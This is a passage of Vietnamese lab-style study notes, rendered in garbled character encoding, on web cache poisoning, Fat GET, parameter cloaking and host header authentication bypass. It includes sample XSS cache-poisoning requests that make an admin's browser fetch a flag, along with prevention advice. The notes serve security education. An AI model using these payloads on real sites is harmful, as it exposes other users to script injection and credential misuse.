   - Táº¥n cÃ´ng cáº§n gá»­i yÃªu cáº§u Ä‘á»™c háº¡i ngay khi cache háº¿t háº¡n Ä‘á»ƒ Ä‘áº£m báº£o pháº£n há»“i Ä‘á»™c háº¡i Ä‘Æ°á»£c lÆ°u trá»¯.  
   - Viá»‡c nÃ y Ä‘Ã²i há»i **phÃ¡n Ä‘oÃ¡n thá»i gian chÃ­nh xÃ¡c** hoáº·c dá»±a vÃ o thÃ´ng tin vá» **thá»i gian tá»“n táº¡i cache** (TTL) trong header `Cache-Control`.

#### 3. **Bypass bá»™ nhá»› Ä‘á»‡m (Cache Bypass):**
   - Sá»­ dá»¥ng header:
     - `Cache-Control: no-cache`  
     - `Pragma: no-cache` (deprecated)
   - Nhá»¯ng header nÃ y buá»™c yÃªu cáº§u Ä‘Æ°á»£c xá»­ lÃ½ trá»±c tiáº¿p bá»Ÿi mÃ¡y chá»§ thay vÃ¬ láº¥y tá»« cache. Tuy nhiÃªn, chÃºng khÃ´ng lÃ m má»›i ná»™i dung Ä‘Ã£ Ä‘Æ°á»£c lÆ°u trá»¯ trong cache.

---

### **CÃ¡c HÃ¬nh Thá»©c Khai ThÃ¡c**

#### **1. Cross-Site Scripting (XSS):**
   - **Sá»­ dá»¥ng tham sá»‘ GET hoáº·c header khÃ´ng Ä‘Æ°á»£c Ä‘Æ°a vÃ o cache key:**  
     VÃ­ dá»¥, khai thÃ¡c tham sá»‘ `ref` hoáº·c header `X-Backend-Server` Ä‘á»ƒ chÃ¨n payload XSS.  

     **Payload máº«u:**  
     ```plaintext
     GET /index.php?language=de&ref="><script>alert(1)</script> HTTP/1.1
     Host: webcache.htb
     ```

   - **Táº¥n cÃ´ng thá»±c táº¿:** Poison cache vá»›i payload Ä‘á»ƒ khi admin truy cáº­p, mÃ£ XSS sáº½ tá»± Ä‘á»™ng thá»±c thi nháº±m gá»­i yÃªu cáº§u láº¥y thÃ´ng tin nháº¡y cáº£m.

#### **2. Khai thÃ¡c Cookies KhÃ´ng ÄÆ°á»£c ÄÆ°a VÃ o Cache Key (Unkeyed Cookies):**
   - **Ká»‹ch báº£n:** Cookie nhÆ° `language=en` hoáº·c `consent=1` Ä‘Æ°á»£c lÆ°u trong cache mÃ  khÃ´ng phÃ¢n biá»‡t giÃ¡ trá»‹.
   - **TÃ¡c Ä‘á»™ng:**  
     - Táº¥t cáº£ ngÆ°á»i dÃ¹ng bá»‹ buá»™c pháº£i sá»­ dá»¥ng cÃ¡c giÃ¡ trá»‹ cookie Ä‘á»™c háº¡i, vÃ­ dá»¥:
       - Äá»•i giao diá»‡n thÃ nh `color=blue`.  
       - Buá»™c hiá»‡n ná»™i dung mÃ  há» chÆ°a Ä‘á»“ng Ã½.

#### **3. Táº¥n cÃ´ng tá»« chá»‘i dá»‹ch vá»¥ (Denial-of-Service - DoS):**
   - **VÃ­ dá»¥:**  
     - Bá»™ nhá»› Ä‘á»‡m sá»­ dá»¥ng header `Host` nhÆ°ng loáº¡i bá» cá»•ng trÆ°á»›c khi lÆ°u cache.  
     - YÃªu cáº§u Ä‘á»™c háº¡i:
       ```plaintext
       GET / HTTP/1.1
       Host: webcache.htb:1337
       ```
     - Khi pháº£n há»“i nÃ y Ä‘Æ°á»£c lÆ°u trá»¯, ngÆ°á»i dÃ¹ng khÃ¡c bá»‹ chuyá»ƒn hÆ°á»›ng Ä‘áº¿n má»™t cá»•ng khÃ´ng há»£p lá»‡, dáº«n Ä‘áº¿n DoS.

---

### **Cache Busters**

**Cache busters** Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng ná»™i dung Ä‘á»™c háº¡i chá»‰ áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c thá»­ nghiá»‡m, khÃ´ng gÃ¢y tÃ¡c Ä‘á»™ng Ä‘áº¿n ngÆ°á»i dÃ¹ng thá»±c táº¿.  

#### **CÃ¡ch sá»­ dá»¥ng:**
   - ThÃªm má»™t tham sá»‘ duy nháº¥t trong yÃªu cáº§u thá»­ nghiá»‡m Ä‘á»ƒ táº¡o cache key khÃ¡c biá»‡t.  
   - **VÃ­ dá»¥:**  
     ```plaintext
     GET /index.php?language=unusedvalue&ref="><script>alert(1)</script> HTTP/1.1
     Host: webcache.htb
     ```
   - Sau má»—i láº§n thá»­ nghiá»‡m, Ä‘iá»u chá»‰nh tham sá»‘ `language` Ä‘á»ƒ táº¡o giÃ¡ trá»‹ má»›i, Ä‘áº£m báº£o khÃ´ng trÃ¹ng láº·p cache key.

---

### **TÃ¡c Äá»™ng Cá»§a Web Cache Poisoning**

1. **Phá»¥ thuá»™c vÃ o lá»— há»•ng cÆ¡ báº£n:**  
   - Táº¥n cÃ´ng chá»§ yáº¿u dá»±a vÃ o cÃ¡c váº¥n Ä‘á» Ä‘Ã£ tá»“n táº¡i trong á»©ng dá»¥ng web, vÃ­ dá»¥ nhÆ° XSS, host header injection, hoáº·c cookie misconfiguration.

2. **Äá»™ tin cáº­y vÃ  sá»‘ lÆ°á»£ng náº¡n nhÃ¢n:**  
   - TÃ¡c Ä‘á»™ng cao náº¿u cÃ³ nhiá»u ngÆ°á»i dÃ¹ng bá»‹ áº£nh hÆ°á»Ÿng trong thá»i gian cache tá»“n táº¡i.  

3. **Cáº¥u hÃ¬nh cache:**  
   - Náº¿u cÃ¡c header nhÆ° `User-Agent` Ä‘Æ°á»£c Ä‘Æ°a vÃ o cache key, káº» táº¥n cÃ´ng pháº£i khai thÃ¡c tá»«ng nhÃ³m má»¥c tiÃªu cá»¥ thá»ƒ.

---


**Káº¿t quáº£:**  
- Header `X-Backend-Server` chá»©a payload XSS, Ä‘Æ°á»£c lÆ°u trong cache vÃ  kÃ­ch hoáº¡t khi admin truy cáº­p trang.

---
# 6. Ká»¹ Thuáº­t Web Cache Poisoning NÃ¢ng Cao

Trong pháº§n nÃ y, chÃºng ta sáº½ tÃ¬m hiá»ƒu hai ká»¹ thuáº­t web cache poisoning nÃ¢ng cao, bao gá»“m **Fat GET** vÃ  **Parameter Cloaking**, khai thÃ¡c cÃ¡c lá»—i cáº¥u hÃ¬nh trÃªn mÃ¡y chá»§ web Ä‘á»ƒ lÃ m lá»™ cÃ¡c cáº¥u hÃ¬nh vá»‘n dÄ© an toÃ n.

---

### **1. Fat GET Requests**

#### **KhÃ¡i niá»‡m:**
- **Fat GET** lÃ  cÃ¡c yÃªu cáº§u HTTP GET cÃ³ kÃ¨m **request body**. Theo chuáº©n HTTP, GET request khÃ´ng Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a Ä‘á»ƒ sá»­ dá»¥ng body, nhÆ°ng khÃ´ng bá»‹ cáº¥m.
- Má»™t sá»‘ mÃ¡y chá»§ web, khi bá»‹ cáº¥u hÃ¬nh sai, cÃ³ thá»ƒ xá»­ lÃ½ cÃ¡c tham sá»‘ tá»« request body, dáº«n Ä‘áº¿n cÃ¡c lá»—i web cache poisoning.

#### **VÃ­ dá»¥ Khai ThÃ¡c Fat GET:**
1. **XÃ¡c Ä‘á»‹nh lá»—i:**
   - Gá»­i má»™t yÃªu cáº§u Fat GET Ä‘á»ƒ kiá»ƒm tra liá»‡u server cÃ³ xá»­ lÃ½ cÃ¡c tham sá»‘ tá»« body khÃ´ng.  
     **Payload máº«u:**
     ```plaintext
     GET /index.php?language=en HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 11
     language=de
     ```
   - Náº¿u pháº£n há»“i hiá»ƒn thá»‹ ná»™i dung báº±ng tiáº¿ng Äá»©c (German) thay vÃ¬ tiáº¿ng Anh (English), mÃ¡y chá»§ xá»­ lÃ½ tham sá»‘ tá»« request body.

2. **Poison Cache:**
   - Gá»­i yÃªu cáº§u Fat GET chá»©a payload Ä‘á»™c háº¡i.  
     **Payload máº«u:**
     ```plaintext
     GET /index.php?language=de HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 142
     ref="><script>var xhr = new XMLHttpRequest();
     xhr.open('GET', '/admin.php?reveal_flag=1', true);
     xhr.withCredentials = true;
     xhr.send();</script>
     ```
   - YÃªu cáº§u trÃªn sáº½ chÃ¨n payload XSS vÃ o cache. Khi admin truy cáº­p, payload sáº½ tá»± Ä‘á»™ng thá»±c thi, gá»­i yÃªu cáº§u Ä‘á»ƒ lá»™ flag.

#### **LÆ°u Ã½:**
- Fat GET thÆ°á»ng do lá»—i cáº¥u hÃ¬nh trÃªn pháº§n má»m mÃ¡y chá»§ web, khÃ´ng pháº£i do á»©ng dá»¥ng web.

---

### **2. Parameter Cloaking**

#### **KhÃ¡i niá»‡m:**
- **Parameter Cloaking** khai thÃ¡c sá»± khÃ¡c biá»‡t trong cÃ¡ch phÃ¢n tÃ­ch tham sá»‘ giá»¯a web cache vÃ  mÃ¡y chá»§ web.
- Khi web cache vÃ  mÃ¡y chá»§ xá»­ lÃ½ cÃ¡c tham sá»‘ GET khÃ¡c nhau, káº» táº¥n cÃ´ng cÃ³ thá»ƒ táº¡o ra sá»± sai lá»‡ch Ä‘á»ƒ khai thÃ¡c lá»— há»•ng.

#### **VÃ­ dá»¥ Khai ThÃ¡c:**
1. **Khai thÃ¡c lá»—i Parameter Cloaking trong Bottle Framework (CVE-2020-28473):**
   - Bottle sá»­ dá»¥ng kÃ½ tá»± **semicolon (;)** Ä‘á»ƒ phÃ¢n tÃ¡ch tham sá»‘, trong khi web cache khÃ´ng xá»­ lÃ½ kÃ½ tá»± nÃ y.
   - Gá»­i yÃªu cáº§u:  
     ```plaintext
     GET /?language=en&a=b;language=de HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - **PhÃ¢n tÃ­ch:**  
     - **Web cache:**  
       - Tham sá»‘: `language=en`, `a=b;language=de`.  
       - LÆ°u pháº£n há»“i dá»±a trÃªn `language=en`.  
     - **Bottle server:**  
       - Tham sá»‘: `language=en`, `a=b`, `language=de`.  
       - GiÃ¡ trá»‹ cuá»‘i cÃ¹ng cá»§a `language` lÃ  `de`, pháº£n há»“i báº±ng tiáº¿ng Äá»©c.

2. **Poison Cache:**
   - Gá»­i yÃªu cáº§u Ä‘á»™c háº¡i vá»›i payload XSS, sá»­ dá»¥ng `;` Ä‘á»ƒ che giáº¥u tham sá»‘:  
     **Payload máº«u:**
     ```plaintext
     GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();
     xhr.open('GET','/admin?reveal_flag=1',true);
     xhr.withCredentials=true;
     xhr.send();%3C/script%3E HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - Khi admin truy cáº­p URL, payload sáº½ Ä‘Æ°á»£c thá»±c thi vÃ  flag sáº½ bá»‹ lá»™.

---

### **So SÃ¡nh Fat GET vÃ  Parameter Cloaking**

| **Yáº¿u Tá»‘**            | **Fat GET**                                  | **Parameter Cloaking**                       |
|------------------------|----------------------------------------------|---------------------------------------------|
| **Khai thÃ¡c**          | Xá»­ lÃ½ tham sá»‘ tá»« request body               | PhÃ¢n tÃ­ch khÃ¡c biá»‡t giá»¯a web cache & server |
| **VÃ­ dá»¥ cá»¥ thá»ƒ**       | Tham sá»‘ trong request body                  | DÃ¹ng `;` Ä‘á»ƒ "áº©n" tham sá»‘ Ä‘á»™c háº¡i            |
| **Äáº·c Ä‘iá»ƒm**           | Do lá»—i mÃ¡y chá»§, khÃ´ng do á»©ng dá»¥ng           | Do lá»—i phÃ¢n tÃ­ch tham sá»‘                    |

---
# 7. CÃ´ng Cá»¥ vÃ  PhÃ²ng Ngá»«a Web Cache Poisoning

#### **1. CÃ´ng Cá»¥ TÃ¬m Lá»— Há»•ng Web Cache Poisoning**

Má»™t trong nhá»¯ng cÃ´ng cá»¥ quan trá»ng Ä‘á»ƒ phÃ¡t hiá»‡n lá»— há»•ng web cache poisoning lÃ  **Web-Cache-Vulnerability-Scanner (WCVS)**. CÃ´ng cá»¥ nÃ y giÃºp xÃ¡c Ä‘á»‹nh cÃ¡c tham sá»‘ nÃ o cá»§a yÃªu cáº§u bá»‹ khÃ³a (keyed) vÃ  tham sá»‘ nÃ o khÃ´ng bá»‹ khÃ³a (unkeyed). WCVS sáº½ tá»± Ä‘á»™ng thÃªm cache buster vÃ o má»—i yÃªu cáº§u Ä‘á»ƒ trÃ¡nh vÃ´ tÃ¬nh lÃ m nhiá»…u cÃ¡c pháº£n há»“i cá»§a ngÆ°á»i dÃ¹ng khÃ¡c.

**CÃ¡ch sá»­ dá»¥ng WCVS:**
1. Táº£i vÃ  giáº£i nÃ©n cÃ´ng cá»¥:
   ```bash
   tar xzf web-cache-vulnerability-scanner_1.1.0_linux_amd64.tar.gz
   ./wcvs -h
   ```

2. Cháº¡y quÃ©t web application:
   ```bash
   ./wcvs -u http://simple.wcp.htb/ -sp language=en -gr
   ```
   - **-u**: URL cá»§a á»©ng dá»¥ng web cáº§n quÃ©t.
   - **-sp**: Äáº·t tham sá»‘ GET, vÃ­ dá»¥ `language=en`.
   - **-gr**: Táº¡o bÃ¡o cÃ¡o.

3. Káº¿t quáº£ sáº½ xuáº¥t hiá»‡n trong bÃ¡o cÃ¡o JSON, chá»‰ ra cÃ¡c tham sá»‘ gÃ¢y lá»—i cache poisoning, vÃ­ dá»¥:
   ```json
   {
     "technique": "Parameters",
     "isVulnerable": true,
     "requests": [
       {
         "reason": "Response Body contained 793369015723",
         "request": "GET /?language=en&ref=793369015723&cb=829054467467 HTTP/1.1",
         "response": ""
       }
     ]
   }
   ```

4. WCVS cÅ©ng giÃºp phÃ¡t hiá»‡n cÃ¡c ká»¹ thuáº­t web cache poisoning nÃ¢ng cao nhÆ° **Fat GET** vÃ  **Parameter Cloaking**.

---

#### **2. PhÃ²ng Ngá»«a Web Cache Poisoning**

PhÃ²ng ngá»«a web cache poisoning Ä‘Ã²i há»i sá»± cáº¥u hÃ¬nh Ä‘Ãºng Ä‘áº¯n vÃ  sá»± nháº­n thá»©c rÃµ rÃ ng vá» sá»± tÆ°Æ¡ng tÃ¡c giá»¯a mÃ¡y chá»§ web vÃ  há»‡ thá»‘ng cache. Má»™t sá»‘ biá»‡n phÃ¡p phÃ²ng ngá»«a bao gá»“m:

- **Cáº¥u hÃ¬nh web cache Ä‘Ãºng cÃ¡ch**: TrÃ¡nh sá»­ dá»¥ng cáº¥u hÃ¬nh máº·c Ä‘á»‹nh cá»§a web cache. CÃ¡c tham sá»‘ yÃªu cáº§u áº£nh hÆ°á»Ÿng Ä‘áº¿n ná»™i dung pháº£n há»“i pháº£i Ä‘Æ°á»£c **khÃ³a** (keyed) Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng cache sá»­ dá»¥ng Ä‘Ãºng tham sá»‘ khi lÆ°u trá»¯ vÃ  phá»¥c vá»¥ dá»¯ liá»‡u.
  
- **KhÃ´ng há»— trá»£ Fat GET**: MÃ¡y chá»§ web cáº§n pháº£i **khÃ´ng cho phÃ©p** cÃ¡c GET request chá»©a request body. Äiá»u nÃ y giÃºp trÃ¡nh cÃ¡c lá»—i mÃ  káº» táº¥n cÃ´ng cÃ³ thá»ƒ khai thÃ¡c báº±ng cÃ¡ch gá»­i GET vá»›i body chá»©a tham sá»‘ Ä‘á»™c háº¡i.

- **Giá»¯ web cache vÃ  mÃ¡y chá»§ web cáº­p nháº­t**: Viá»‡c cáº­p nháº­t thÆ°á»ng xuyÃªn giÃºp giáº£m thiá»ƒu cÃ¡c lá»—i cáº¥u hÃ¬nh vÃ  cÃ¡c lá»— há»•ng báº£o máº­t cÃ³ thá»ƒ táº¡o ra cÃ¡c lá»— há»•ng trong quÃ¡ trÃ¬nh phÃ¢n tÃ­ch yÃªu cáº§u.

- **GiÃ¡m sÃ¡t vÃ  sá»­a chá»¯a cÃ¡c lá»— há»•ng client-side**: Ngay cáº£ khi lá»— há»•ng XSS (Cross-Site Scripting) khÃ´ng thá»ƒ khai thÃ¡c má»™t cÃ¡ch truyá»n thá»‘ng (vÃ­ dá»¥, qua XSS pháº£n chiáº¿u), web cache poisoning cÃ³ thá»ƒ lÃ m cho cÃ¡c lá»— há»•ng nÃ y trá»Ÿ thÃ nh má»‘i nguy hiá»ƒm. Do Ä‘Ã³, táº¥t cáº£ cÃ¡c lá»— há»•ng client-side cáº§n pháº£i Ä‘Æ°á»£c vÃ¡ ká»‹p thá»i.

- **ÄÃ¡nh giÃ¡ láº¡i viá»‡c sá»­ dá»¥ng web cache**: Náº¿u khÃ´ng cáº§n thiáº¿t, viá»‡c sá»­ dá»¥ng web cache cÃ³ thá»ƒ gÃ¢y phá»©c táº¡p trong triá»ƒn khai. Má»™t lá»±a chá»n lÃ  chá»‰ cache cÃ¡c tÃ i nguyÃªn tÄ©nh nhÆ° **stylesheets** vÃ  **scripts**, qua Ä‘Ã³ giáº£m thiá»ƒu kháº£ nÄƒng bá»‹ web cache poisoning. Tuy nhiÃªn, cáº§n Ä‘áº£m báº£o ráº±ng khÃ´ng cÃ³ lá»—i khi web cache Ä‘Æ°á»£c lá»«a dá»‘i vÃ  lÆ°u trá»¯ cÃ¡c tÃ i nguyÃªn khÃ´ng tÄ©nh.

#### **LÆ°u Ã PhÃ²ng Ngá»«a:**

1. **Cáº¥u hÃ¬nh Keyed Parameters**: Äáº£m báº£o ráº±ng má»—i tham sá»‘ cÃ³ áº£nh hÆ°á»Ÿng Ä‘áº¿n pháº£n há»“i (nhÆ° `language`, `ref`, v.v.) Ä‘á»u pháº£i Ä‘Æ°á»£c **khÃ³a** khi lÆ°u trá»¯ trong cache.

2. **Giá»›i háº¡n Caching**: Náº¿u khÃ´ng cáº§n thiáº¿t, cÃ³ thá»ƒ **háº¡n cháº¿** viá»‡c cache chá»‰ Ä‘á»‘i vá»›i cÃ¡c tÃ i nguyÃªn tÄ©nh, Ä‘iá»u nÃ y cÃ³ thá»ƒ trÃ¡nh Ä‘Æ°á»£c viá»‡c web cache poisoning.

---
# 8. Giá»›i Thiá»‡u vá» CÃ¡c Cuá»™c Táº¥n CÃ´ng Host Header

#### **1. HTTP Host Header**

**Host header** lÃ  má»™t header báº¯t buá»™c ká»ƒ tá»« phiÃªn báº£n HTTP/1.1 vÃ  nÃ³ chá»‰ Ä‘á»‹nh mÃ¡y chá»§ má»¥c tiÃªu mÃ  yÃªu cáº§u HTTP sáº½ gá»­i Ä‘áº¿n. ÄÃ¢y lÃ  má»™t yáº¿u tá»‘ quan trá»ng khi má»™t mÃ¡y chá»§ web cháº¡y nhiá»u á»©ng dá»¥ng khÃ¡c nhau vÃ  cáº§n phÃ¢n biá»‡t giá»¯a chÃºng. TÃ¹y thuá»™c vÃ o giÃ¡ trá»‹ cá»§a **Host header** trong yÃªu cáº§u, mÃ¡y chá»§ web sáº½ tráº£ vá» pháº£n há»“i khÃ¡c nhau.

Äiá»u nÃ y Ä‘áº·c biá»‡t quan trá»ng trong cÃ¡c mÃ´i trÆ°á»ng mÃ  má»™t mÃ¡y chá»§ web cÃ³ thá»ƒ cháº¡y nhiá»u á»©ng dá»¥ng web khÃ¡c nhau trÃªn cÃ¹ng má»™t Ä‘á»‹a chá»‰ IP vÃ  cá»•ng (thÆ°á»ng lÃ  cá»•ng 80 hoáº·c 443). CÃ¡c mÃ¡y chá»§ web vÃ  **Content Delivery Networks** (CDNs) nhÆ° Akamai hoáº·c Cloudflare sá»­ dá»¥ng Host header Ä‘á»ƒ quyáº¿t Ä‘á»‹nh á»©ng dá»¥ng web nÃ o sáº½ phá»¥c vá»¥ yÃªu cáº§u Ä‘Ã³. Tuy nhiÃªn, náº¿u má»™t yÃªu cáº§u thiáº¿u **Host header há»£p lá»‡**, nÃ³ cÃ³ thá»ƒ dáº«n Ä‘áº¿n cÃ¡c váº¥n Ä‘á» trong viá»‡c Ä‘á»‹nh tuyáº¿n yÃªu cáº§u Ä‘áº¿n Ä‘Ãºng á»©ng dá»¥ng web.

**VÃ­ dá»¥ vá» cáº¥u hÃ¬nh Apache cho hai á»©ng dá»¥ng web khÃ¡c nhau:**
```apache
<VirtualHost *:80>
    DocumentRoot "/var/www/testapp"
    ServerName testapp.htb
</VirtualHost>

<VirtualHost *:80>
    DocumentRoot "/var/www/anotherdomain"
    ServerName anotherdomain.org
</VirtualHost>
```
Trong vÃ­ dá»¥ nÃ y, hai á»©ng dá»¥ng web sáº½ Ä‘Æ°á»£c phá»¥c vá»¥ tá»« cÃ¡c Ä‘Æ°á»ng dáº«n khÃ¡c nhau trÃªn há»‡ thá»‘ng, vÃ  Apache sáº½ quyáº¿t Ä‘á»‹nh á»©ng dá»¥ng nÃ o sáº½ phá»¥c vá»¥ dá»±a trÃªn giÃ¡ trá»‹ cá»§a **Host header** trong yÃªu cáº§u HTTP. Náº¿u **Host header** lÃ  `testapp.htb`, mÃ¡y chá»§ sáº½ phá»¥c vá»¥ á»©ng dá»¥ng `testapp`. Náº¿u giÃ¡ trá»‹ lÃ  `anotherdomain.org`, mÃ¡y chá»§ sáº½ phá»¥c vá»¥ á»©ng dá»¥ng thá»© hai.

---

#### **2. CÃ¡c Lá»— Há»•ng Host Header**

CÃ¡c lá»— há»•ng **Host header** xáº£y ra khi á»©ng dá»¥ng web khÃ´ng kiá»ƒm tra hoáº·c lÃ m sáº¡ch Ä‘Ãºng cÃ¡ch giÃ¡ trá»‹ cá»§a Host header. Äiá»u nÃ y cÃ³ thá»ƒ dáº«n Ä‘áº¿n cÃ¡c váº¥n Ä‘á» báº£o máº­t nghiÃªm trá»ng:

- **Bá» qua xÃ¡c thá»±c**: Má»™t á»©ng dá»¥ng web khÃ´ng nÃªn sá»­ dá»¥ng **Host header** Ä‘á»ƒ kiá»ƒm tra xÃ¡c thá»±c. Náº¿u á»©ng dá»¥ng tin tÆ°á»Ÿng vÃ o giÃ¡ trá»‹ cá»§a Host header mÃ  khÃ´ng kiá»ƒm tra Ä‘Ãºng cÃ¡ch, káº» táº¥n cÃ´ng cÃ³ thá»ƒ thay Ä‘á»•i Host header Ä‘á»ƒ bá» qua cÃ¡c biá»‡n phÃ¡p xÃ¡c thá»±c, cháº³ng háº¡n nhÆ° Ä‘Äƒng nháº­p.
  
- **Táº¥n cÃ´ng "password reset poisoning"**: Nhiá»u á»©ng dá»¥ng web sá»­ dá»¥ng giÃ¡ trá»‹ cá»§a Host header Ä‘á»ƒ táº¡o cÃ¡c liÃªn káº¿t tuyá»‡t Ä‘á»‘i, cháº³ng háº¡n nhÆ° liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u. Náº¿u giÃ¡ trá»‹ **Host header** khÃ´ng Ä‘Æ°á»£c kiá»ƒm tra cáº©n tháº­n vÃ  á»©ng dá»¥ng web táº¡o liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u dá»±a trÃªn Ä‘Ã³, káº» táº¥n cÃ´ng cÃ³ thá»ƒ thay Ä‘á»•i giÃ¡ trá»‹ Host header Ä‘á»ƒ táº¡o ra cÃ¡c liÃªn káº¿t Ä‘á»™c háº¡i, dáº«n Ä‘áº¿n viá»‡c ngÆ°á»i dÃ¹ng bá»‹ gá»­i liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u Ä‘áº¿n má»™t trang giáº£ máº¡o.

#### **3. Thá»­ Nghiá»‡m CÃ¡c Cuá»™c Táº¥n CÃ´ng Host Header**

Trong mÃ´i trÆ°á»ng thá»±c táº¿, viá»‡c thá»­ nghiá»‡m cÃ¡c lá»— há»•ng **Host header** cÃ³ thá»ƒ gáº·p khÃ³ khÄƒn do cÃ¡c há»‡ thá»‘ng trung gian nhÆ° **CDN** vÃ  **reverse proxies** cÃ³ thá»ƒ xá»­ lÃ½ yÃªu cáº§u dá»±a trÃªn giÃ¡ trá»‹ **Host header**. Náº¿u Host header chá»©a giÃ¡ trá»‹ khÃ´ng há»£p lá»‡, cÃ¡c há»‡ thá»‘ng nÃ y cÃ³ thá»ƒ khÃ´ng biáº¿t pháº£i chuyá»ƒn tiáº¿p yÃªu cáº§u Ä‘i Ä‘Ã¢u vÃ  cÃ³ thá»ƒ tá»« chá»‘i hoáº·c tráº£ vá» lá»—i. Tuy nhiÃªn, cÃ¡c cuá»™c táº¥n cÃ´ng **Host header** váº«n cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c náº¿u káº¿t há»£p vá»›i cÃ¡c ká»¹ thuáº­t táº¥n cÃ´ng khÃ¡c nhÆ° **web cache poisoning**.

---

#### **4. Override Headers vÃ  Táº¥n CÃ´ng Host Header**

NgoÃ i **Host header**, cÃ²n cÃ³ nhá»¯ng **Override Headers** khÃ¡c cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ thay tháº¿ giÃ¡ trá»‹ cá»§a **Host header** vÃ  cÃ³ thá»ƒ bá»‹ khai thÃ¡c trong cÃ¡c cuá»™c táº¥n cÃ´ng **Host header**. Nhá»¯ng header nÃ y bao gá»“m:

- **X-Forwarded-Host**
- **X-HTTP-Host-Override**
- **Forwarded**
- **X-Host**
- **X-Forwarded-Server**

Trong má»™t sá»‘ trÆ°á»ng há»£p, á»©ng dá»¥ng web cÃ³ thá»ƒ Ä‘Ã£ Ã¡p dá»¥ng kiá»ƒm tra há»£p lá»‡ cho **Host header** nhÆ°ng láº¡i khÃ´ng kiá»ƒm tra cÃ¡c **Override Headers** nÃ y, táº¡o ra lá»— há»•ng Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ khai thÃ¡c. Náº¿u á»©ng dá»¥ng há»— trá»£ cÃ¡c **Override Headers** vÃ  khÃ´ng kiá»ƒm tra chÃºng Ä‘Ãºng cÃ¡ch, káº» táº¥n cÃ´ng cÃ³ thá»ƒ thay Ä‘á»•i giÃ¡ trá»‹ cá»§a cÃ¡c header nÃ y Ä‘á»ƒ vÆ°á»£t qua cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ vÃ  thá»±c hiá»‡n cÃ¡c cuá»™c táº¥n cÃ´ng **Host header**.

---
# 9. Táº¥n CÃ´ng Bá» Qua XÃ¡c Thá»±c (Authentication Bypass) qua Host Header

#### **1. Tá»•ng Quan**

Khai thÃ¡c cÃ¡c cuá»™c táº¥n cÃ´ng **host header** khÃ´ng pháº£i lÃºc nÃ o cÅ©ng Ä‘Æ¡n giáº£n, nhÆ°ng khi thÃ nh cÃ´ng, chÃºng cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng bá» qua cÃ¡c kiá»ƒm tra báº£o máº­t, bao gá»“m cáº£ **authentication bypass**. Trong trÆ°á»ng há»£p nÃ y, á»©ng dá»¥ng web cÃ³ thá»ƒ sá»­ dá»¥ng **Host header** Ä‘á»ƒ kiá»ƒm tra xem yÃªu cáº§u cÃ³ Ä‘áº¿n tá»« máº¡ng ná»™i bá»™ hay khÃ´ng, mÃ  khÃ´ng thá»±c sá»± kiá»ƒm tra Ä‘Ãºng cÃ¡ch hoáº·c khÃ´ng xÃ¡c thá»±c Ä‘áº§y Ä‘á»§, khiáº¿n á»©ng dá»¥ng trá»Ÿ nÃªn dá»… bá»‹ táº¥n cÃ´ng.

#### **2. VÃ­ Dá»¥ vá» Táº¥n CÃ´ng Authentication Bypass**

**BÆ°á»›c 1: Nháº­n diá»‡n lá»— há»•ng**

Trong vÃ­ dá»¥ nÃ y, chÃºng ta cÃ³ má»™t á»©ng dá»¥ng web Ä‘Æ¡n giáº£n vá»›i má»™t khu vá»±c quáº£n trá»‹ (admin area). Tuy nhiÃªn, khi cá»‘ gáº¯ng truy cáº­p vÃ o khu vá»±c quáº£n trá»‹ thÃ´ng qua Ä‘Æ°á»ng dáº«n `/admin.php`, á»©ng dá»¥ng web tráº£ vá» má»™t lá»—i yÃªu cáº§u chá»‰ cÃ³ thá»ƒ truy cáº­p tá»« máº¡ng ná»™i bá»™.

**ThÃ´ng bÃ¡o lá»—i:**
```
The admin area can only be accessed locally!
```
DÃ²ng thÃ´ng bÃ¡o nÃ y chá»‰ ra ráº±ng á»©ng dá»¥ng web kiá»ƒm tra yÃªu cáº§u Ä‘á»ƒ xÃ¡c Ä‘á»‹nh xem nÃ³ cÃ³ Ä‘áº¿n tá»« má»™t máº¡ng ná»™i bá»™ hay khÃ´ng. Váº­y, lÃ m tháº¿ nÃ o Ä‘á»ƒ á»©ng dá»¥ng kiá»ƒm tra nguá»“n gá»‘c cá»§a yÃªu cáº§u nÃ y?

Má»™t trong nhá»¯ng phÆ°Æ¡ng phÃ¡p dá»… dÃ ng vÃ  an toÃ n Ä‘á»ƒ kiá»ƒm tra lÃ  sá»­ dá»¥ng Ä‘á»‹a chá»‰ IP cá»§a yÃªu cáº§u. Tuy nhiÃªn, náº¿u á»©ng dá»¥ng web náº±m sau má»™t **reverse proxy**, viá»‡c kiá»ƒm tra dá»±a trÃªn Ä‘á»‹a chá»‰ IP cÃ³ thá»ƒ gáº·p khÃ³ khÄƒn. Má»™t cÃ¡ch khÃ¡c lÃ  kiá»ƒm tra **Host header**, vÃ  Ä‘Ã¢y chÃ­nh lÃ  lá»— há»•ng mÃ  káº» táº¥n cÃ´ng cÃ³ thá»ƒ khai thÃ¡c.

**BÆ°á»›c 2: Khai thÃ¡c lá»— há»•ng**

